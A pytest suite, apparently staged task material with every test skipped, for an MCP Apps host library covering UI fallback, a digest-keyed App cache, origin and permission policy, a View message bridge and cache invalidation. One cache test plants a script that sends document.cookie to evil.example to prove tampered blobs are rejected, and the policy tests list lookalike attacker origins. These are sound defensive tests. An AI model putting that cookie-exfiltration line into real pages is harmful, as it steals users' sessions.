import asyncio
import hashlib
import itertools
import json
import time

import pytest
from appbridge.bridge import ViewBridge
from appbridge.cache import AppCache
from appbridge.invalidation import CachedEntry, HostState, MountedView, plan_invalidation
from appbridge.policy import HostPolicy, Refused
from appbridge.review import AppMount, ReviewError
from appbridge.server import McpAppServer
from appbridge.wire import (
    APPS_EXTENSION,
    CLIENT_CAPABILITIES_META,
    PROTOCOL_META,
    SERVER_INFO_META,
    make_request,
)


def call(server, method, params=None, *, apps=True, capabilities=None):
    """Send one request the way a host does: a full envelope plus its routing headers."""
    body, headers = make_request(method, 1, params, apps=apps)
    if capabilities is not None:
        body["params"]["_meta"][CLIENT_CAPABILITIES_META] = capabilities
    return server.handle(body, headers)


def sha256(text: str) -> str:
    return hashlib.sha256(text.encode("utf-8")).hexdigest()


def raises(error, action, *args, **kwargs) -> bool:
    try:
        action(*args, **kwargs)
    except error:
        return True
    return False


MANY_NOTES = [
    {"id": f"note-{i}", "title": f"Note {i}", "created": f"2026-07-{28 + i % 3}"} for i in range(12500)
]


@pytest.mark.skip("Part 1")
def test_ui_fallback() -> None:
    """Apps hosts get the UI binding and its resource; every other host gets the same tool as text."""
    server = McpAppServer(MANY_NOTES)
    _, listing = call(server, "tools/list")
    (tool,) = listing["result"]["tools"]
    assert "_meta" in tool, "an Apps host sees the tool's UI binding in tools/list"
    uri = tool["_meta"]["ui"]["resourceUri"]
    status, reply = call(server, "resources/read", {"uri": uri})
    assert status == 200, f"an Apps host reads the UI that tools/list bound, got {reply.get('error')}"
    content = reply["result"]["contents"][0]
    settings = {"extensions": {APPS_EXTENSION: {"com.example/preview": True}}}
    _, configured = call(server, "tools/list", capabilities=settings)
    assert configured["result"]["tools"] == [tool], "any object under extensions declares the Apps extension"

    text_tool = {key: value for key, value in tool.items() if key != "_meta"}
    for capabilities in ({"extensions": {}}, {}):
        _, plain = call(server, "tools/list", capabilities=capabilities)
        assert plain["result"]["tools"] == [text_tool], (
            f"a host that did not declare the extension gets the same tool, without _meta.ui: {capabilities}"
        )
    for capabilities in ({"extensions": {APPS_EXTENSION: True}}, {"extensions": [APPS_EXTENSION]}):
        _, odd = call(server, "tools/list", capabilities=capabilities)
        assert odd["result"]["tools"] == [text_tool], (
            f"only an object under extensions declares the Apps extension: {capabilities}"
        )
    status, answer = call(server, "tools/call", {"name": "notes_timeline", "arguments": {}}, apps=False)
    assert status == 200 and "Note 12499" in answer["result"]["content"][0]["text"], (
        "without Apps the tool still answers with a useful text timeline"
    )

    status, refusal = call(server, "resources/read", {"uri": uri}, apps=False)
    assert (status, refusal.get("error", {}).get("code")) == (400, -32021), (
        "a host without the Apps extension is refused the UI with -32021"
    )
    assert refusal["error"].get("data") == {"requiredCapabilities": {"extensions": {APPS_EXTENSION: {}}}}, (
        "the error names the extension the host has to declare"
    )
    _, odd = call(server, "resources/read", {"uri": uri}, capabilities={"extensions": [APPS_EXTENSION]})
    assert odd.get("error", {}).get("code") == -32021, "only an object under extensions declares the Apps extension"
    status, unknown = call(server, "resources/read", {"uri": "ui://notes/other.html"})
    assert (status, unknown.get("error", {}).get("code")) == (400, -32602), "an unknown resource is still -32602"

    digest = sha256(content["text"])
    csp = dict(content["_meta"]["ui"]["csp"], connectDomains=["https://api.example.com"])
    wide = dict(content, _meta={"ui": {"csp": csp, "permissions": {}}})
    mount = AppMount(wide, admitted=[digest])
    start = time.perf_counter()
    reviews = [mount.review() for _ in range(2000)]  # one per action the View asks for
    elapsed = time.perf_counter() - start
    assert reviews[-1].digest == digest and reviews[-1].csp["connectDomains"] == ("https://api.example.com",)
    assert elapsed < 0.05, "checking an action should not review the whole resource again"

    mount.replace(content)
    assert mount.review().csp["connectDomains"] == (), "a new version is reviewed before the View acts under it"
    mount.replace(dict(content, text=content["text"].replace("</html>", "<!-- v3 --></html>")))
    assert raises(ReviewError, mount.review), (
        "a version the host has not admitted runs under no review, not under the last one"
    )
    mount.replace(wide)
    assert mount.review().digest == digest
    mount.withdraw(digest)
    assert raises(ReviewError, mount.review), "a withdrawn digest stops the View at its next action"


SERVER = {"name": "timeline-app-server", "version": "2.0.0"}
UPGRADED = {"name": "timeline-app-server", "version": "2.1.0"}
NEIGHBOUR = {"name": "board-app-server", "version": "2.0.0"}
PAGE = (
    "<!doctype html>\r\n<html lang=\"fr\"><body>\r\n<h1>Caf\u00e9 \u2014 \u6771\u4eac</h1>\r"
    "<p>line\u2028separator</p>\n<script>window.parent.postMessage(m, \"https://host.example\")</script>\n"
    "</body></html>\n"
)


def app_entry(text: str, *, uri: str = "ui://notes/timeline.html", connect=(), permissions=None) -> dict:
    """A resources/read content entry for an MCP App."""
    return {
        "uri": uri,
        "mimeType": "text/html;profile=mcp-app",
        "text": text,
        "_meta": {
            "ui": {
                "csp": {
                    "connectDomains": list(connect),
                    "resourceDomains": [],
                    "frameDomains": [],
                    "baseUriDomains": [],
                },
                "permissions": dict(permissions or {}),
            }
        },
    }


@pytest.mark.skip("Part 2")
def test_app_cache_roundtrip(tmp_path) -> None:
    """Cached App resources come back exactly, and only for the server, version and principal they belong to."""
    root = tmp_path / "apps"
    cache = AppCache(root)
    page = app_entry(PAGE, connect=["https://b.example", "https://a.example"], permissions={"camera": {}})
    page["_meta"]["com.example/build"] = "2026.07.28-1"
    digest = cache.put(SERVER, page, scope="public")
    assert digest == sha256(PAGE), "the digest is the sha256 hex of the HTML's UTF-8 bytes"
    assert (root / "blobs" / digest).read_bytes() == PAGE.encode("utf-8"), (
        "blobs/<digest> holds the HTML bytes exactly"
    )
    assert cache.get(SERVER, page["uri"], digest) == page, "an App resource round-trips exactly"

    reopened = AppCache(root)
    assert reopened.get(SERVER, page["uri"], digest, principal="bob") == page, (
        "a fresh cache on the same folder sees earlier entries, and a public entry is for anyone"
    )
    assert reopened.get(UPGRADED, page["uri"], digest) is None, "another server version is another entry"
    assert reopened.get(NEIGHBOUR, page["uri"], digest) is None, "another server is another entry"

    edited = app_entry(PAGE.replace("Caf\u00e9", "Th\u00e9"))
    edited_digest = reopened.put(SERVER, edited, scope="public")
    assert reopened.get(SERVER, page["uri"], digest) == page, "the digest is part of the key"
    assert reopened.get(SERVER, page["uri"], edited_digest) == edited, "the digest is part of the key"
    assert reopened.put(UPGRADED, page, scope="public") == digest
    assert reopened.get(UPGRADED, page["uri"], digest) == page
    assert sorted(path.name for path in (root / "blobs").iterdir()) == sorted([digest, edited_digest]), (
        "identical HTML is stored once"
    )

    mine = "ui://notes/mine.html"
    alice, bob = app_entry("<p>alice's notes</p>", uri=mine), app_entry("<p>bob's notes</p>", uri=mine)
    alice_digest = reopened.put(SERVER, alice, scope="private", principal="alice")
    bob_digest = reopened.put(SERVER, bob, scope="private", principal="bob")
    assert reopened.get(SERVER, mine, alice_digest, principal="alice") == alice
    assert reopened.get(SERVER, mine, bob_digest, principal="bob") == bob
    for who in ("bob", "carol", None):
        assert reopened.get(SERVER, mine, alice_digest, principal=who) is None, (
            f"a private entry is only for its own principal, not for {who}"
        )
    team = "<p>team notes</p>"
    alice_team = app_entry(team, uri=mine, connect=["https://alice.notes.example"])
    bob_team = app_entry(team, uri=mine)
    team_digest = reopened.put(SERVER, alice_team, scope="private", principal="alice")
    assert reopened.put(SERVER, bob_team, scope="private", principal="bob") == team_digest
    assert (reopened.get(SERVER, mine, team_digest, principal="alice"),
            reopened.get(SERVER, mine, team_digest, principal="bob")) == (alice_team, bob_team), (
        "the same HTML read for two principals is two entries: the principal is part of a private key"
    )
    assert raises(ValueError, reopened.put, SERVER, alice, scope="private"), (
        "a private entry needs the principal it was read for"
    )
    assert raises(ValueError, reopened.put, SERVER, dict(page, mimeType="text/html"), scope="public"), (
        "only MCP Apps are cached: text/html;profile=mcp-app"
    )
    assert raises(ValueError, reopened.put, SERVER, dict(page, uri="https://notes.example/timeline.html"),
                  scope="public"), "only ui:// resources are cached"

    (root / "blobs" / digest).write_bytes(b"<script>fetch('https://evil.example/?' + document.cookie)</script>")
    assert reopened.get(SERVER, page["uri"], digest) is None, "a blob that does not match its digest is a miss"
    reopened.put(SERVER, page, scope="public")
    assert reopened.get(SERVER, page["uri"], digest) == page, "storing the resource again repairs a damaged blob"
    (root / "blobs" / edited_digest).unlink()
    assert reopened.get(SERVER, page["uri"], edited_digest) is None, "a missing blob is a miss"

    # One HTML blob can back entries whose reviewed policies are all different.
    metadata_root = tmp_path / "metadata"
    shared_html = "<main>shared executable HTML: Café</main>\r\n"
    shared_digest = sha256(shared_html)
    identities = [
        (SERVER, "ui://shared/timeline.html", "public", None),
        (UPGRADED, "ui://shared/timeline.html", "public", None),
        (NEIGHBOUR, "ui://shared/timeline.html", "public", None),
        (SERVER, "ui://shared/board.html", "public", None),
        (SERVER, "ui://shared/private.html", "private", "alice"),
        (SERVER, "ui://shared/private.html", "private", "bob"),
    ]
    entries = []
    for number, (owner, uri, scope, principal) in enumerate(identities):
        entry = app_entry(shared_html, uri=uri, connect=[f"https://policy-{number}.example"],
                          permissions={"camera" if number % 2 else "microphone": {}})
        entry["_meta"]["ui"]["csp"]["resourceDomains"] = [f"https://assets-{number}.example"]
        entry["_meta"]["com.example/build"] = {"number": number, "flags": [False, number, None]}
        entry["_meta"]["com.example/retired"] = f"policy-{number}"
        entries.append(json.loads(json.dumps(entry)))
        assert AppCache(metadata_root).put(owner, entry, scope=scope, principal=principal) == shared_digest, (
            "security metadata does not change the HTML blob digest"
        )
    assert [path.name for path in (metadata_root / "blobs").iterdir()] == [shared_digest], (
        "all policy variants share exactly one HTML blob"
    )
    for identity, expected in zip(identities, entries):
        owner, uri, scope, principal = identity
        assert AppCache(metadata_root).get(owner, uri, shared_digest, principal=principal or "visitor") == expected, (
            "same HTML keeps each server, version, URI and principal's complete security metadata"
        )
    for principal in (None, "visitor"):
        assert AppCache(metadata_root).get(SERVER, "ui://shared/private.html", shared_digest,
                                           principal=principal) is None, (
            "a shared public blob never makes a private entry public"
        )
    narrowed = app_entry(shared_html, uri=identities[1][1])
    narrowed["_meta"]["com.example/build"] = {"number": 99, "flags": []}
    assert AppCache(metadata_root).put(UPGRADED, narrowed, scope="public") == shared_digest, (
        "a metadata-only replacement keeps the same HTML blob"
    )
    entries[1] = narrowed
    for identity, expected in zip(identities, entries):
        owner, uri, scope, principal = identity
        assert AppCache(metadata_root).get(owner, uri, shared_digest, principal=principal or "visitor") == expected, (
            "replacing one entry replaces its whole metadata and leaves every other entry unchanged"
        )

    _, reply = call(McpAppServer(), "resources/read", {"uri": "ui://notes/timeline.html"})
    result = reply["result"]
    live = result["contents"][0]
    server_info = result["_meta"][SERVER_INFO_META]
    live_digest = AppCache(root).put(server_info, live, scope=result["cacheScope"], principal="alice")
    cached = AppCache(root).get(SERVER, live["uri"], live_digest, principal="bob")
    assert cached == live and AppMount(cached, admitted=[live_digest]).review().digest == live_digest, (
        "the lesson's App, read for alice, is public: it comes back for bob and passes review"
    )


VIEW_ORIGIN = "https://view.notes.example"
REVIEWED = {
    "csp": {
        "connectDomains": ["https://api.notes.example", "wss://live.notes.example"],
        "resourceDomains": ["https://cdn.notes.example"],
    },
    "permissions": {"camera": {}},
}


@pytest.mark.skip("Part 3")
def test_host_policy() -> None:
    """The host decides every load, device, message and privileged action at the moment it happens."""
    policy = HostPolicy(VIEW_ORIGIN, REVIEWED, capabilities=["tools", "navigate"])
    for kind, url in (
        ("fetch", "https://api.notes.example/v1/notes?limit=5"),
        ("xhr", "https://api.notes.example?since=2026-07-28"),
        ("websocket", "wss://live.notes.example"),
        ("font", "https://cdn.notes.example/inter.woff2"),
    ):
        assert policy.may_load(kind, url), f"a listed origin is reachable, with any path or none: {url}"
    assert not policy.may_load("xhr", "https://cdn.notes.example/upload"), "resourceDomains does not grant connect"
    assert not policy.may_load("script", "https://api.notes.example/app.js"), (
        "connectDomains does not grant scripts, styles, images or fonts"
    )
    for url in (
        "https://api.notes.example.evil.test/collect",
        "https://api.notes.example@evil.test/collect",
        "http://api.notes.example/v1/notes",
        "https://api.notes.example:8443/v1/notes",
    ):
        assert not policy.may_load("fetch", url), f"a URL's origin must equal a listed origin exactly: {url}"
    partial = HostPolicy(VIEW_ORIGIN, {"csp": {"connectDomains": ["https://api.notes.example"]}}, capabilities=[])
    assert not partial.may_load("image", "https://cdn.notes.example/a.png"), "a missing CSP list is empty"
    empty = HostPolicy(VIEW_ORIGIN, {}, capabilities=[])
    assert not empty.may_load("fetch", "https://api.notes.example/") and not empty.may_use("camera"), (
        "an App that declares nothing gets nothing"
    )

    assert policy.may_use("camera")
    assert not policy.may_use("microphone") and not policy.may_use("location"), (
        "a device is allowed only when the resource declares it"
    )

    assert policy.accepts(VIEW_ORIGIN)
    impostors = (VIEW_ORIGIN + "/", VIEW_ORIGIN + ".evil.test", "https://notes.example", "null", "")
    for origin in impostors:
        assert not policy.accepts(origin), f"only the View's exact origin is accepted, not {origin!r}"
    assert raises(ValueError, HostPolicy, "*", REVIEWED, capabilities=["tools"]), (
        "a wildcard pin would accept messages from any frame"
    )

    click = policy.request("tools", "notes_delete", {"id": "note-1"}, user_gesture=True)
    assert raises(Refused, policy.run, click), "a click inside the View is intent, not the user's approval"
    policy.approve(click)
    assert policy.run(click) == {"capability": "tools", "target": "notes_delete", "arguments": {"id": "note-1"}}
    assert raises(Refused, policy.run, click), "a call runs at most once"

    opened = policy.request("tools", "notes_open", {"id": "note-2"})
    leave = policy.request("navigate", "https://docs.notes.example/help", {})
    export = policy.request("tools", "notes_export", {"format": "csv"})
    policy.approve(opened)
    assert policy.revoke("tools") == [opened, export], (
        "revoking a capability rejects every pending call under it, oldest first"
    )
    assert raises(Refused, policy.run, opened), "an approval does not survive the revocation"
    assert raises(Refused, policy.request, "tools", "notes_open", {"id": "note-3"}), (
        "a revoked capability is refused"
    )
    policy.grant("tools")
    policy.approve(export)
    assert raises(Refused, policy.run, export), "a call rejected by a revocation stays rejected after a new grant"
    policy.approve(leave)
    assert policy.run(leave)["target"] == "https://docs.notes.example/help", (
        "calls under other capabilities stay pending"
    )
    assert raises(Refused, policy.request, "clipboard", "copy", {"text": "x"}), (
        "a capability the host never advertised is refused"
    )


VIEW = "https://view.notes.example"
HOST_CAPABILITIES = {"tools": {}}
HOST_CONTEXT = {"theme": "light", "size": {"width": 640, "height": 480}}
MAX_SIZE = {"width": 800, "height": 600}
APP_INFO = {"appInfo": {"name": "notes-timeline", "version": "1.0.0"}, "appCapabilities": {}}
TIMELINE_RESULT = {
    "resultType": "complete",
    "content": [{"type": "text", "text": "2026-07-28 Discover"}],
    "structuredContent": {"notes": [{"id": "note-1", "title": "Discover", "created": "2026-07-28"}]},
    "isError": False,
}
OPENED = {"resultType": "complete", "content": [{"type": "text", "text": "Per-request metadata"}], "isError": False}
UNKNOWN_NOTE = {"code": -32602, "message": "Unknown note"}


def from_view(message) -> dict:
    return {"type": "view", "message": message}


def notification(method: str, params: dict) -> dict:
    return {"jsonrpc": "2.0", "method": method, "params": params}


def bridge_frames(events, send_core, replies=None) -> list:
    """Run a ViewBridge over an inbox; return (events pulled so far, target origin, message) per frame.

    replies collects the core responses send_core produces; each one arrives right after the event that caused it.
    """
    pulled = []
    replies = [] if replies is None else replies

    async def inbox():
        for event in events:
            pulled.append(event)
            yield event
            while replies:
                pulled.append(replies[0])
                yield replies.pop(0)

    async def main() -> list:
        bridge = ViewBridge(
            view_origin=VIEW,
            host_capabilities=HOST_CAPABILITIES,
            host_context=HOST_CONTEXT,
            max_size=MAX_SIZE,
            send_core=send_core,
            core_ids=itertools.count(1000),
        )
        frames = []
        async for origin, message in bridge.run(inbox()):
            frames.append((len(pulled), origin, json.loads(json.dumps(message))))
        return frames

    return asyncio.run(main())


@pytest.mark.skip("Part 4")
def test_bridge_lifecycle() -> None:
    """The host answers the View at once, holds its own messages until the View is ready, and proxies tool calls."""
    sent = []
    events = [
        from_view({"jsonrpc": "2.0", "id": "boot", "method": "initialize", "params": {}}),
        from_view({"jsonrpc": "2.0", "id": 0, "method": "ui/initialize", "params": APP_INFO}),
        {"type": "tool-result", "result": TIMELINE_RESULT},
        {"type": "context", "changes": {"theme": "dark"}},
        from_view({"jsonrpc": "2.0", "method": "notifications/initialized"}),
        from_view(notification("ui/notifications/size-changed", {"width": 1200, "height": 700})),
        from_view("ready?"),
        from_view({"id": 9, "method": "ui/initialize", "params": APP_INFO}),
        from_view({"jsonrpc": "2.0", "method": "ui/notifications/initialized"}),
        from_view({"jsonrpc": "2.0", "id": 5, "result": {"ok": True}}),
        from_view({"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {
            "name": "notes_open", "arguments": {"id": "note-2"}, "principal": "admin",
            "_meta": {PROTOCOL_META: "2025-11-25"}}}),
        from_view({"jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": {
            "name": "notes_open", "arguments": {"id": "note-9"}}}),
        {"type": "core", "response": {"jsonrpc": "2.0", "id": 1001, "error": UNKNOWN_NOTE}},
        {"type": "core", "response": {"jsonrpc": "2.0", "id": 1000, "result": OPENED}},
        {"type": "core", "response": {"jsonrpc": "2.0", "id": 1000, "result": OPENED}},
        {"type": "context", "changes": {"theme": "light"}},
    ]
    frames = bridge_frames(events, send_core=lambda body, headers: sent.append((body, headers)))
    assert {origin for _, origin, _ in frames} == {VIEW}, "every frame is posted to the View's exact origin"
    messages = [message for _, _, message in frames]
    answers = [message for message in messages if "method" not in message]
    notices = [message for message in messages if "method" in message]
    assert answers == [
        {"jsonrpc": "2.0", "id": "boot", "error": {"code": -32601, "message": "Method not found"}},
        {"jsonrpc": "2.0", "id": 0, "result": {"hostCapabilities": HOST_CAPABILITIES, "hostContext": HOST_CONTEXT}},
        {"jsonrpc": "2.0", "id": 2, "error": UNKNOWN_NOTE},
        {"jsonrpc": "2.0", "id": 1, "result": OPENED},
    ], "each View request is answered once, under the id the View used"
    assert all("id" not in message for message in notices), "a notification carries no id"
    assert notices == [
        notification("ui/notifications/tool-result", TIMELINE_RESULT),
        notification("ui/notifications/host-context-changed", {"theme": "dark"}),
        notification("ui/notifications/host-context-changed", {"size": {"width": 800, "height": 600}}),
        notification("ui/notifications/host-context-changed", {"theme": "light"}),
    ], "host notifications go out in the order they happened, with the size the host allows"
    assert [count for count, _, _ in frames] == [1, 2, 9, 9, 9, 13, 14, 16], (
        "answers go out at once; host notifications wait for ui/notifications/initialized"
    )
    assert sent == [
        make_request("tools/call", 1000, {"name": "notes_open", "arguments": {"id": "note-2"}}),
        make_request("tools/call", 1001, {"name": "notes_open", "arguments": {"id": "note-9"}}),
    ], "each tools/call becomes a new core request with the host's own id and metadata"

    server = McpAppServer()
    replies = []

    def to_server(body, headers) -> None:
        replies.append({"type": "core", "response": server.handle(body, headers)[1]})

    live = bridge_frames(
        [
            {"type": "context", "changes": {"theme": "dark"}},
            from_view({"jsonrpc": "2.0", "id": 0, "method": "ui/initialize", "params": APP_INFO}),
            from_view({"jsonrpc": "2.0", "method": "ui/notifications/initialized"}),
            from_view({"jsonrpc": "2.0", "id": 7, "method": "tools/call", "params": {"name": "notes_timeline"}}),
        ],
        send_core=to_server,
        replies=replies,
    )
    assert live[0][2]["result"]["hostContext"] == dict(HOST_CONTEXT, theme="dark"), (
        "ui/initialize answers with the host context as it is now"
    )
    last = live[-1][2]
    assert last["id"] == 7 and "result" in last, (
        f"the server accepts the proxied call as a request of its own: {last}"
    )
    assert last["result"]["_meta"][SERVER_INFO_META] == {"name": "timeline-app-server", "version": "2.0.0"}


TIMELINE = "ui://notes/timeline.html"
NOTE = "ui://notes/note.html"
STATS = "ui://notes/stats.html"
LEGACY = "ui://notes/legacy.html"
BOARD = "ui://tasks/board.html"


def host_state() -> HostState:
    return HostState(
        bindings={
            ("tasks", "tasks_timeline"): TIMELINE,
            ("notes", "notes_open"): NOTE,
            ("notes", "notes_timeline"): TIMELINE,
            ("notes", "notes_stats"): STATS,
            ("tasks", "tasks_board"): BOARD,
            ("notes", "notes_board"): TIMELINE,
        },
        entries={
            "e6": CachedEntry("notes", LEGACY, "d5"),
            "e3": CachedEntry("notes", NOTE, "d3", "bob"),
            "e1": CachedEntry("notes", TIMELINE, "d1"),
            "e5": CachedEntry("tasks", TIMELINE, "d1"),
            "e2": CachedEntry("notes", NOTE, "d2", "alice"),
            "e4": CachedEntry("tasks", BOARD, "d4"),
        },
        views={
            "v6": MountedView("tasks", "tasks_timeline", "e5"),
            "v4": MountedView("notes", "notes_open", "e3"),
            "v1": MountedView("notes", "notes_timeline", "e1"),
            "v7": MountedView("notes", "notes_stats", "e9"),
            "v3": MountedView("notes", "notes_open", "e2"),
            "v5": MountedView("tasks", "tasks_board", "e4"),
            "v2": MountedView("notes", "notes_board", "e1"),
        },
        subscriptions={("notes", NOTE), ("tasks", BOARD), ("tasks", TIMELINE)},
    )


@pytest.mark.skip("Part 5")
def test_invalidation_plan() -> None:
    """A change drops exactly the cache entries it reaches and remounts exactly the Views built on them."""
    state = host_state()

    def plan(*events) -> tuple:
        result = plan_invalidation(state, list(events))
        return result.drop, result.remount

    assert plan({"type": "expired", "entry": "e2"}) == (["e2"], ["v3"]), (
        "an expired entry is dropped on its own, with the Views mounted from it"
    )
    assert plan({"type": "expired", "entry": "e5"}) == (["e5"], ["v6"]), (
        "an entry that shares its blob with another entry is still dropped on its own"
    )
    assert plan({"type": "updated", "server": "notes", "uri": NOTE}) == (["e2", "e3"], ["v3", "v4"]), (
        "a change notification drops every copy of its resource, whoever it was cached for"
    )
    assert plan({"type": "updated", "server": "notes", "uri": TIMELINE}) == ([], []), (
        "a change notification counts only on an acknowledged subscription"
    )
    assert plan({"type": "binding", "server": "notes", "tool": "notes_board", "uri": NOTE}) == (
        ["e1", "e2", "e3"],
        ["v1", "v2", "v3", "v4"],
    ), "a binding change invalidates the old and the new resource, and everything mounted on them"
    assert plan({"type": "binding", "server": "notes", "tool": "notes_share", "uri": NOTE}) == (
        ["e2", "e3"],
        ["v3", "v4"],
    ), "a tool bound for the first time has no old resource"
    assert plan({"type": "server", "server": "tasks"}) == (["e4", "e5"], ["v5", "v6"]), (
        "a server change stays on that server, whatever URIs it shares with others"
    )
    assert plan({"type": "server", "server": "notes"}) == (
        ["e1", "e2", "e3", "e6"],
        ["v1", "v2", "v3", "v4", "v7"],
    ), "a server change reaches every resource it serves and every View of a tool bound to one"
    assert plan(
        {"type": "expired", "entry": "e4"},
        {"type": "updated", "server": "tasks", "uri": BOARD},
        {"type": "expired", "entry": "e2"},
    ) == (["e2", "e4"], ["v3", "v5"]), "a batch gives one plan: each entry and View once, sorted"
    assert raises(ValueError, plan, {"type": "renamed", "server": "notes"}), "an unknown change event is an error"
    assert state == host_state(), "planning reads the host state and changes nothing in it"
